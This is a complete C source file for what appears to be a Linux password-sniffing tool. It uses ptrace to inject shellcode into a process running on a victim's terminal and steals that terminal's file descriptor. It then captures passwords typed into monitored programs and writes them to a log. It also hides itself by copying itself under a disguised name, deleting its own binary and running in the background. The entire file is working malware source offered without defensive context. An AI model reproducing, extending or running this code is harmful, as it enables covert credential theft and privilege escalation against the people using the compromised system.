#include <sys/ptrace.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <sys/inotify.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/un.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <errno.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <dirent.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <termios.h>
#include <sched.h>
#include <pthread.h>

#include "saltty.h"
#include "conf.h"

#define PERROR(str) fprintf(logfile, str ": %s", strerror(errno))

#define SYSCALL(ret, sys, p1, p2, p3) {\
	uint64_t __ret;\
	uint64_t __sys = sys;\
	uint64_t __p1, __p2, __p3;\
	__p1 = (uint64_t) p1; \
	__p2 = (uint64_t) p2; \
	__p3 = (uint64_t) p3; \
	asm (\
		"mov %1, %%rax\n"\
		"mov %2, %%rdi\n"\
		"mov %3, %%rsi\n"\
		"mov %4, %%rdx\n"\
		"syscall\n"\
		"mov %%rax, %0"\
		: "=r" ((uint64_t) __ret)\
		: "r" ((uint64_t) __sys), "r" ((uint64_t)__p1), "r" ((uint64_t)__p2), "r" ((uint64_t)__p3)\
		: "rax", "rdi", "rsi", "rdx", "memory" \
	);\
	ret = __ret;\
}

#define MEMSET(start, val, size) {\
	size_t i; \
	for (i = 0; i < size; i++) {\
		((uint8_t*)start)[i] = (uint8_t) val; \
	}\
}


#define STRCPY(dst, src) {\
	size_t i; \
	for (i = 0; i < sizeof(dst) && src[i] != 0; i++) {\
		dst[i] = src[i];\
	}\
}

#define TRAP asm ("int $3")

typedef void (*handler_t)(state_t *st);
typedef int (*action_t)(int pid, state_t *state);

char *monitor_inject[] = INJECT_LIST;
char *monitor_sniff[] = SNIFF_LIST;
handler_t handler_sniff[] = HANDLER_LIST;
pthread_cond_t cond = PTHREAD_COND_INITIALIZER;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
FILE *logfile;

int process_info(int pid) {
	int fd;
	int tty;
	static char buf[256];
	static char buf2[1024];
	ssize_t s;

	snprintf(buf, 256, "/proc/%d/stat", pid);
	fd = open(buf, O_RDONLY);
	if (fd == -1)
		return -1;
	s = read(fd, buf2, sizeof(buf2));
	if (s <= 0)
		return -1;
	buf2[s] = 0;
	sscanf(buf2, "%*u %*s %*c %*u %*u %*u %u", &tty);
	close(fd);
	return tty;
}

void log_password(state_t *st) {
	char buf[512];
	char timestr[512];
	char cmdline[1024];
	char path[PATH_MAX];
	int fd;
	ssize_t r;
	int i;
	struct tm *tm;
	time_t t;

	r = read_tty(st, buf, sizeof(buf));
	if (r > 0) {
		if (buf[r-1] == '\n') {
			buf[r-1] = 0;
		} else buf[r] = 0;
		t = time(NULL);
		tm = localtime(&t);
		strftime(timestr, sizeof(timestr), "%c", tm);
		snprintf(path, sizeof(path), "/proc/%u/cmdline", st->pid);
		fd = open(path, O_RDONLY);
		r = read(fd, cmdline, sizeof(cmdline));
		if (r > 0) {
			cmdline[r] = 0;
			for (i = 0; i < (r - 1); i++)
				if (cmdline[i] == 0)
					cmdline[i] = ' ';

		} else cmdline[0] = 0;
		fprintf(logfile, "[%s] BIN=%s CMDLINE=\"%s\" PASSWORD=\"%s\"\n", timestr, st->name, cmdline, buf);
		close(fd);
	} else PERROR("read password");
}

int steal_tty(int pid, state_t *i);

int filter_inject(int pid, state_t *state) {
	int r;
	if (!ptrace(PTRACE_ATTACH, pid, 0, 0)) {
		r = steal_tty(pid, state);
		ptrace(PTRACE_DETACH, pid, 0, 0);
		// In any case detach the process. If the injection failed, try again (possibly with another process).
		return !r;
	} 
	return 0;
}

int filter_sniff(int pid, state_t *state) {
	int cur_tty = process_info(pid);
	if (state->tty == cur_tty) {
		state->pid = pid;
		return 1;
	}
	return 0;
}

void monitor(int msec, char **files, action_t filter, state_t *state) {
	int fd, i, infd;
	unsigned int startpid;
	pid_t p;
	ssize_t s;
	static char buf[1024];
	struct inotify_event *ine;
	struct timeval start, now;
	int evfds[MONITOR_MAX];

	infd = inotify_init();
	if (infd == -1) {
		exit(0);
	}

	for (i = 0; files[i] && i < MONITOR_MAX; i++) {
		evfds[i] = inotify_add_watch(infd, files[i], IN_OPEN);
		if (evfds[i] == -1) {
			exit(0);
		}
	}
	fd = open("/proc/loadavg", O_RDONLY);
	for(;;) {
	        fprintf(logfile, "Monitoring...\n");
		s = read(infd, buf, sizeof(buf));
		fprintf(logfile, "Activity detected! Waking up.\n");
		if (s <= 0) {
			exit(0);
		} 
		ine = (struct inotify_event *) buf;
		for (i = 0; files[i] && i < MONITOR_MAX; i++) {
			if (evfds[i] == ine->wd) {
				strncpy(state->name, files[i], sizeof(state->name));
				state->idx = i;
				break;
			}
		}
		startpid = 1;

                gettimeofday(&start, NULL);
		for (;;) {
			s = read(fd, buf, sizeof(buf));
			if (s > 0) {
				int maxpid, endpid;
				int quit = 0;
				buf[s] = 0;
				sscanf(buf, "%*f %*f %*f %*u/%*u %u", &maxpid);
				if (startpid == 1)
					startpid = maxpid;
				/* 
				 * FIXME: it is not guaranteed that startpid is the PID of the monitored binary,
				 * but in practice it is (almost) always the case.
				 */
				endpid = (maxpid + 1) % PID_MAX;
				p = startpid;
				while (!(quit = filter(p, state)) && (p != endpid)) {
					p = (p + 1) % PID_MAX;
				}
				if (quit)
					return;
			}
			lseek(fd, 0, SEEK_SET);
			sched_yield();
			gettimeofday(&now, NULL);
			if (((now.tv_sec - start.tv_sec)*1000 + (now.tv_usec - start.tv_usec)/1000) >= msec)
			  break;
		}
		fprintf(logfile, "False alarm.. Going back to sleep.\n");
	}
	close(fd);
}

__attribute__ ((aligned(8)))
void endpassfd();

__attribute__ ((aligned(8)))
void passfd() {
	char *path = (char*) endpassfd + 8;
	char buf[256];
	int sock;
	int r;
	struct iovec iov;
	struct sockaddr_un remote;
	struct cmsghdr *cmsg;
	struct msghdr msg;

	SYSCALL(sock, SYS_socket, AF_UNIX, SOCK_STREAM, 0);
	if (sock < 0)
		TRAP;
	MEMSET(&remote, 0, sizeof(remote));
	remote.sun_family = AF_UNIX;
	STRCPY(remote.sun_path, path);
	SYSCALL(r, SYS_connect, sock, (struct sockaddr *) &remote, sizeof(remote));
	if (r < 0)
		TRAP;

	MEMSET(&msg, 0, sizeof(msg));
	msg.msg_control = buf;
	msg.msg_controllen = CMSG_LEN(sizeof(int));
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	iov.iov_base = "a";
	iov.iov_len = 1;
	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_len = CMSG_LEN(sizeof(int));
	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	*(int*)CMSG_DATA(cmsg) = 0;

	SYSCALL(r, SYS_sendmsg, sock, &msg, 0);
	if (r < 0)
		TRAP;
	SYSCALL(r, SYS_close, sock, 0, 0);
	TRAP;
}

void endpassfd() {}

int do_injection(int pid, state_t *state) {
	struct user_regs_struct urs, saved_regs;
	struct sockaddr_un local;
	struct sockaddr_un remote;
	struct msghdr msg;
	struct iovec iov;
	struct cmsghdr *cmsg;
	char buf[256];
	char template[32];
	char dirpath[32];
	uint64_t backup[PAGE_SIZE / 8];
	uint64_t addr;
	unsigned int i;
	int sock, r, cfd, wi;
	socklen_t remotelen = sizeof(remote);
	unsigned char *data;
	uint8_t *ptr;
	char *sockpath;


	fprintf(logfile, "Injecting tty-stealer...\n");
	sock = socket(AF_UNIX, SOCK_STREAM, 0); 
	if (sock == -1)  {
		PERROR("socket");
		return -1;
	}
	memset(&local, 0, sizeof(local));
	local.sun_family = AF_UNIX;
	strcpy(template, TMPDIR "/sockXXXXXX");
	sockpath = mkdtemp(template);
	if (!sockpath) {
		PERROR("mkdtemp");
		return -1;
	}
	strcpy(dirpath, sockpath);
	strcat(sockpath, "/sock");

	strcpy(local.sun_path, sockpath);
	if (bind(sock, (struct sockaddr *) &local, sizeof(local)) == -1) {
		PERROR("bind");
		return -1;
	}
	if (listen(sock, 5) == -1) {
		PERROR("listen");
		return -1;
	}
	if (ptrace(PTRACE_GETREGS, pid, NULL, &urs) == -1) {
		PERROR("getregs");
		return -1;
	}
	memcpy(&saved_regs, &urs, sizeof(urs));

	addr = urs.rip & ~(PAGE_SIZE - 1);
                      
	for (i = 0; i < (PAGE_SIZE / 8); i++) {
		errno = 0;
		backup[i] = ptrace(PTRACE_PEEKTEXT, pid, addr + i*8, 0);
		if (errno) {
			PERROR("peektext");
			return -1;
		}
	}
                      
	for (ptr = (uint8_t*)passfd; ptr < (uint8_t*)endpassfd; ptr += 8)
		if (ptrace(PTRACE_POKETEXT, pid, addr + (ptr - (uint8_t*)passfd), *((uint64_t *)ptr)) == -1) {
			PERROR("poketext");
			return -1;
		}
                      
	for (i = 0; i < 32; i++ )
		if (ptrace(PTRACE_POKETEXT, pid, addr + 8 + ((uint8_t*) endpassfd - (uint8_t*)passfd) + i*8 , *(((uint64_t*) sockpath) + i)) == -1) {
			PERROR("poketext");
			return -1;
		}

	urs.rip = addr;
	if (ptrace(PTRACE_SETREGS, pid, NULL, &urs) == -1) {
		PERROR("setregs");
		return -1;
	}
	ptrace(PTRACE_CONT, pid, NULL, 0);
	if (waitpid(pid, &wi, 0) == -1) {
		PERROR("waitpid");
		return -1;
	}
	fprintf(logfile, "Injected code finished execution, restoring original process context...\n");

	for (i = 0; i < 512; i++) {
		if (ptrace(PTRACE_POKETEXT, pid, addr + i*8, backup[i]) == -1) {
			PERROR("restore data");
			return -1;
		}
	}

	// Restart syscall correctly
	saved_regs.rip -= 2;
	saved_regs.rax = saved_regs.orig_rax;

	if (ptrace(PTRACE_SETREGS, pid, NULL, &saved_regs) == -1) {
		PERROR("restore regs");
		return -1;
	}
  
	memset(&remote, 0, sizeof(remote));
	if ((cfd = accept(sock, (struct sockaddr *) &remote, &remotelen)) == -1) {
		PERROR("accept");
		return -1;
	}

	memset(&msg, 0, sizeof(msg));
	memset(&iov, 0, sizeof(iov));
	iov.iov_base = "abcd";
	iov.iov_len = 4;
	msg.msg_control = buf;
	msg.msg_controllen = sizeof(buf);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 0;
	// FIXME: add timeout? nonblock?
	if (( r = recvmsg(cfd, &msg, 0)) == -1) {
		PERROR("recvmsg");
		return -1;
	}
	cmsg = CMSG_FIRSTHDR(&msg);
	data = CMSG_DATA(cmsg);
	if (data == NULL) {
		fprintf(logfile, "No data received on socket\n");
		return -1;
	}
	int myfd = *((int*) data);
	fprintf(logfile, "Received stolen tty file descriptor from victim process!\n");
	state->fd = myfd;
	unlink(sockpath);
	rmdir(dirpath);
	return 0;
}

int steal_tty(int pid,  state_t *state) {
	int r, wi;
	char path[512];
	char link[512];
	struct stat st;
	int forward_signal = 0;
	
	snprintf(path, 512, "/proc/%u/fd/0", pid);
	if ((r = readlink(path, link, sizeof(link))) <= 0) {
		PERROR("readlink");
		return -1;
	}
	link[r] = 0;
	if (lstat(link, &st) == -1) {
		PERROR("lstat");
		return -1;
	}
	state->tty = st.st_rdev;
	if (!strstr(link, "pts") && !strstr(link, "tty"))
		return -1; 
	fprintf(logfile, "Victim process found: %d (on tty: %s)\n", pid, link);

	for (;;) {
		if (waitpid(pid, &wi, 0) == -1)  {
			PERROR("waitpid");
			return -1;
                }
		if (WIFEXITED(wi)) {
		        fprintf(logfile, "Victim process exited before we could inject (code %d).\n", WEXITSTATUS(wi));
			return -1;
		} 
		if (WIFSIGNALED(wi)) {
		        fprintf(logfile, "Victim process was killed before we could inject (signal %d).\n", WTERMSIG(wi));
			return -1;
		} 
		siginfo_t si;
                r = ptrace(PTRACE_GETSIGINFO, pid, 0, &si);
                if ((r == -1) && (errno == EINVAL)) {
			fprintf(logfile, "Group-stop detected, injection aborted as this case cannot be handled reliably in all Linux versions, see ptrace(2).\n");
			exit(0);
			return -1;
                } else if ((si.si_code <= 0) || (si.si_code == SI_KERNEL)) { 
			if (!forward_signal) {
				if (si.si_signo == SIGSTOP)
					forward_signal = 1; // Got the SIGSTOP from the ptrace attach.
				si.si_signo = 0;
			}
			ptrace(PTRACE_SYSCALL, pid, NULL, si.si_signo);
                } else break; 
	}
	return do_injection(pid, state);
}

void *reader_routine(void *data) {
	state_t *state = data;
	char buf[256];
	int r;
	pthread_mutex_lock(&mutex);
	pthread_cond_wait(&cond, &mutex);
	pthread_mutex_unlock(&mutex);
	r = read(state->fd, buf, sizeof(buf));
	// FIXME: possible data misordering if thread is preempted here (very unlikely)
	if (r >= 0) {
		buf[r] = 0;
		write(state->wfd, buf, r);
	}
	return NULL;
}

void echo_on(state_t *st) {
	struct termios tio;
	// should always succeed as long as st->fd is valid. If not, there is not much we can do anyway.
	tcgetattr(st->fd, &tio);
	tio.c_lflag |= ECHO;
	tcsetattr(st->fd, TCSANOW, &tio);
}

void echo_off(state_t *st) {
	struct termios tio;
	tcgetattr(st->fd, &tio);
	tio.c_lflag &= ~ECHO;
	tcsetattr(st->fd, TCSANOW, &tio);
}

void finish_read(state_t *st) {
	int i;
	for (i = 0; i < READER_THREADS; i++)
		pthread_cancel(st->threads[i]);
}

ssize_t read_tty(state_t *st, void *buf, size_t count) {
	if (st->nreads >= READER_THREADS) {
		return 0;
	}
	st->nreads++;
	return read(st->rfd, buf, count);
}

int main(int argc, char **argv) {
	state_t st;
	int pipetab[2];
	char path[PATH_MAX];
	char mypath[PATH_MAX];
	char buf[4096];
	char *ptr;
	int fd, wfd, r, i;

	if (!getenv("HIDDEN")) {
		// We hide by copying binary, because the argv[0] trick fail to work with some process listing tools.
		strcpy(path, TMPDIR "/dirXXXXXX");
		if (!mkdtemp(path)) {
			perror("mkdtemp");
			exit(1);
		}
		strcat(path, "/" HIDDEN_NAME);
		if (readlink("/proc/self/exe", mypath, sizeof(mypath)) == -1) {
			perror("readlink");
			exit(1);
		}
		fd = open(mypath, O_RDONLY);
		if (fd == -1) {
			perror("open");
			exit(1);
		}
		wfd = open(path, O_WRONLY|O_CREAT|O_TRUNC, 0700);
		if (wfd == -1) {
			perror("open write");
			exit(1);
		}
		while ((r = read(fd, buf, sizeof(buf))) > 0)
			write(wfd, buf, r);
		if (r == -1) {
			perror("read");
			exit(1);
		}
		close(fd);
		close(wfd);
		putenv("HIDDEN=1");
		execl(path, HIDDEN_NAME, NULL);
		perror("execl");
		exit(0);
	}
	printf("Hidden as: %s\n", HIDDEN_NAME);

	if (readlink("/proc/self/exe", mypath, sizeof(mypath)) == -1) {
		perror("readlink");
		exit(1);
	}
	if (unlink(mypath) == -1) {
		perror("unlink");
		exit(1);
	}
	ptr = strrchr(mypath, '/');
	if (ptr == NULL) {
		fprintf(stderr, "malformed path name: %s\n", mypath);
		exit(1);
	}
	*ptr = '\0';
	if (rmdir(mypath) == -1) {
		perror("rmdir");
		exit(1);
	} 

#ifndef DEBUG
	logfile = fopen(LOG_FILE, "a");
	if (logfile == NULL) {
		perror("open");
		exit(1);
	}
	if (fork() != 0)
	  exit(0);
#else
	logfile = stdout;
#endif
	setvbuf(logfile, NULL, _IONBF, 0);

        fprintf(logfile, "Started as PID %u, waiting for injectable process...\n", getpid());
	monitor(100, monitor_inject, filter_inject, &st);
	setsid();

	st.file = fdopen(st.fd, "a");
	setvbuf(st.file, NULL, _IONBF, 0);

	for (;;) {
		if (pipe(pipetab) == -1) {
			PERROR("pipe");
			exit(1);
		}
		st.wfd = pipetab[1];
		st.rfd = pipetab[0];
		for (i = 0; i < READER_THREADS; i++) 
			pthread_create(&st.threads[i], NULL, reader_routine, (void*) &st);
		fprintf(logfile, "Waiting for sniffable process...\n");
		monitor(0, monitor_sniff, filter_sniff, &st);
		fprintf(logfile, "Sniffable process found: %s\n", st.name);

		pthread_mutex_lock(&mutex);
		pthread_cond_broadcast(&cond);
		pthread_mutex_unlock(&mutex);
		st.nreads = 0;
		handler_sniff[st.idx](&st);
		finish_read(&st);

		for (i = 0; i < READER_THREADS; i++) 
			pthread_join(st.threads[i], NULL);
		close(st.wfd);
		close(st.rfd);
	}
	return 0;
}
